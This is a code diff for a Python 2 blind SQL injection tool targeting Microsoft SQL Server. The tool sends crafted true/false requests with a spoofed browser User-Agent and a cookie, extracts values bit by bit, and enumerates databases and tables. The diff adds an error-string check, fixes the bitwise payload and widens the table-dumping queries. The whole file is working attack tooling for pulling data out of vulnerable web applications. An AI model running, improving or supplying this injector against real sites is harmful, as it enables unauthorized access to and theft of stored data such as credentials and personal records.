@@ -25,8 +25,9 @@ class MssqlTrueFalse:
 
 		return sqli
 
-	def __init__(self, url, post, cookie,verbose=False,error="",modification="0", output_dir="my_dump"):
+	def __init__(self, url, post, cookie,verbose=False,error="",modification="0", output_dir="my_dump", bug=""):
 		self.target = 0
+		self.bug=bug
 		self.limit=1
 		self.stat=0
 		self.modif = modification
@@ -66,6 +67,7 @@ class MssqlTrueFalse:
 				sys.exit()
 			else:
 				os.mkdir("dump/" + output_dir)
+		ok = self.testInjection()
 		self.output_dir = output_dir
 
 	def testInjection(self):
@@ -130,7 +132,7 @@ class MssqlTrueFalse:
 			return self.count("select len((" + request + "))",0,20)
 
 	def bitGuessing(self, request, bit, queue):
-		string = self.tricks("(cast(cast(" + request + " %26 " + str(pow(2,bit)) + " as bit) as CHAR(1))) = 1")
+		string = self.tricks("(cast(cast(" + request + " & " + str(pow(2,bit)) + " as bit) as CHAR(1))) = 1")
 		self.changeInject(string)
 		if self.testTrueFalse():
 			queue.put(1<<bit)
@@ -173,13 +175,19 @@ class MssqlTrueFalse:
 		return int(math.ceil(min+((max-min)/2)))
 
 	def testTrueFalse(self):
+		res=self.doRequest()
+		if self.bug != "":
+			if re.search(self.bug,res):
+				print "Error in injection"
+				sys.exit()
+
 		if self.error == "":
-			if self.doRequest() == self.valide:
+			if res == self.valide:
 				return True
 			else:
 				return False
 		else:
-			if re.search(self.error,self.doRequest()):
+			if re.search(self.error,res):
 				return False
 			else:
 				return True
@@ -211,7 +219,9 @@ class MssqlTrueFalse:
 		request=urllib2.Request(url.replace(" ", "%20"))
 		request.add_header("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) Gecko/20061010 Firefox/2.0")
 		request.add_header("Cookie",cookie.replace(" ", "%20"))
-		request.add_data(post.replace(" ", "%20"))
+		if post:
+			#request.add_data(post.replace(" ", "%20"))
+			request.add_data(post)
 		try:
 			page=urllib2.urlopen(request)
 			result = page.read()
@@ -219,7 +229,6 @@ class MssqlTrueFalse:
 				print "Page length : %d"%len(result)
 		except:
 			result = "404"
-
 
 		self.stat+=1
 		return result
@@ -286,6 +295,7 @@ class MssqlTrueFalse:
 	def dumpSpecial(self, function, begin = 1, end = 0):
 		self.limit=0
 		request=self.conditionRequest(function,'')
+		begin, end = self.restore(request,begin,end)
 		end=2
 		return self.dump(request,"",begin,end)
 
@@ -302,11 +312,11 @@ class MssqlTrueFalse:
 		return self.dump(request, "name", begin,end)
 
 	def countTables(self,database,condition=""):
-		request=self.conditionRequest("select count(distinct(name)) from " + database + "..sysobjects where xtype = char(0x55)",condition)
+		request=self.conditionRequest("select count(distinct(sysobjects.name)) from " + database + "..sysobjects join "+ database + "..syscolumns on sysobjects.id = syscolumns.id where sysobjects.xtype = char(0x55)",condition)
 		return self.count(request)
 
 	def dumpTables(self, database, begin = 1, end = 0, condition=""):
-		request=self.conditionRequest("select distinct(name) from " + database + "..sysobjects where xtype = char(0x55)",condition)
+		request=self.conditionRequest("select distinct(sysobjects.name) from " + database + "..sysobjects join "+ database + "..syscolumns on sysobjects.id = syscolumns.id where sysobjects.xtype = char(0x55)",condition)
 		begin, end = self.restore(request,begin,end)
 		if end==0:
 			end=self.countTables(database, condition)
@@ -360,13 +370,14 @@ if __name__ == "__main__":
 	parser.add_option("-C", "--Condition", action="store", type="string", dest="condition",default="", help="Specify condition ex : -C 'login=admin'")
 	parser.add_option("-m", "--Modif", action="store", type="string", dest="modification",default="0", help="Specify tricks to bypass filter (type -m list to list the tricks)")
 	parser.add_option("-w", "--write", action="store", type="string", dest="output_dir",default="my_dump", help="Directory to save the dump")
+	parser.add_option("-B", "--bug", action="store", type="string", dest="bug",default="", help="A string that mean request bugged")
 
 	(options, args) = parser.parse_args()
 	if options.modification == "list":
 		print "-m 1 : transform strings with quotes to char(0x) concat"
 		sys.exit()
 	a = int(time.time())
-	myInjector = MssqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification, options.output_dir)
+	myInjector = MssqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification, options.output_dir, options.bug)
 
 	begin = int(options.begin,10)
 	end = int(options.end,10)
